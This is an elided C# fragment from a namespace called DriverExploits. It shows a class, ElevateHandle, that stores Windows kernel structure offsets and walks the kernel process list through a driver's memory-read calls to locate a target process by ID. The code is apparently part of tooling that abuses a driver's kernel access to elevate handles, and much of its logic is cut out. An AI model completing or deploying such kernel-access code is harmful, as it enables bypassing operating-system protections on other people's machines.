...
namespace DriverExploits
{
    ...
    public unsafe static class ElevateHandle
    {
        ...
        public static ulong g_VersionLong { get; set; }
        public static uint g_OffsetDirectoryTable { get; set; }
        public static uint g_OffsetProcessId { get; set; }
        public static uint g_OffsetProcessLinks { get; set; }
        public static uint g_ImageName { get; set; }
        public static uint g_SectionBaseAddress { get; set; }
        public static uint g_OffsetObjectTable { get; set; }
        public static bool g_IsWindows7Machine { get; set; }
        #endregion

        public static void Attach(int id) => g_Context = FindProcessInfo((uint)id);
//        public static void Attach() => g_Context = FindProcessInfo((uint)Process.GetCurrentProcess().Id);
        ...
        public static NT.ProcessContext FindProcessInfo(uint targetProcessId)
        {
            ...
            for (var currentLink = listHead; currentLink != lastLink; currentLink = Driver.ReadSystemAddress<ulong>(currentLink))
            {
                ...
                if (processId == targetProcessId)
                {
                    ...
                    processContext.ImageName = Driver.ReadSystemString(currentEntry + g_ImageName);
                    processContext.SectionBaseAddress = Driver.ReadSystemAddress<ulong>(currentEntry + g_SectionBaseAddress);
                    break;
                }
            }
